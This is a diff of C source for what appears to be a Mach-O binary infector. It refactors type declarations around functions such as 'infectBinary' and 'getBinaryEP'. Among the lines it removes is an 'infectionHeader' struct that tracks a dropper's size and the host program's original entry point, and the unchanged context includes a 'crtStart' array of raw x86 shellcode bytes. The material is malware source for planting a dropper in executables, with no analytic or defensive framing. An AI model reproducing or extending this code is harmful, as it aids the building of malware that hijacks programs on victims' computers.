@@ -20,19 +20,14 @@
 #define PAGE_ALIGNMENT  0x1000
 #define MH_EXECUTE      0x2
 
-#ifdef WIN32
-typedef unsigned long vm_offset_t;
-typedef unsigned long vm_size_t;
-typedef int cpu_type_t;
-#endif
-
-typedef int cpu_subtype_t;
-typedef int kern_return_t;
-typedef int vm_prot_t;
-typedef int mach0_vm_prot_t;
-typedef int kern_return_t;
 
 int numberOfResources;
+
+#ifdef WIN32
+typedef TCHAR _mChar;
+#else
+typedef char _mChar;
+#endif
 
 //
 // Type of strings
@@ -41,13 +36,6 @@ int numberOfResources;
 #define STRING_DATA   0x0002
 
 #define CPU_TYPE_X86  0x7
-
-#define SWAP_LONG(a) ( ((a) << 24) | \
-                        (((a) << 8) & 0x00ff0000) | \
-                        (((a) >> 8) & 0x0000ff00) | \
-                        ((unsigned long)(a) >> 24) )
-
-typedef int cpu_type_t;
 
 unsigned char crtStart[] = "\x6a\x00\x89\xe5\x83\xe4\xf0\x83\xec"
                            "\x10\x8b\x5d\x04\x89\x5c\x24\x00\x8d"
@@ -69,29 +57,7 @@ int gKextFileSize;
 
 int gFileType; // 0 = SingleArch, 1 = FAT, 2 = FAT (swap)
 int gNumStrings;
-struct fatHeader gFatHeader;
-
-typedef struct _infectionHeader
-{
-  int numberOfResources;
-  int numberOfStrings;
-  int dropperSize;
-  unsigned long originalEP;
-} infectionHeader;
-
-typedef struct _strings
-{
-  char value[8];
-  int type;
-} stringTable;
-
-typedef struct _resource
-{
-  unsigned int type;
-  char name[32];
-  char path[32];
-  unsigned int size;
-} resourceHeader;
+struct fat_header gFatHeader;
 
 unsigned int
 getBinaryEP (void *machoBase);
@@ -116,13 +82,8 @@ infectBinary (int aBinaryType,
 int
 getBinaryFormat (char *aFilePointer);
 
-#ifdef WIN32
 void
-usage (TCHAR *aBinaryName);
-#else
-void
-usage (char *aBinaryName);
-#endif
+usage (_mChar *aBinaryName);
 
 int
 parseArguments (int argc, char **argv);
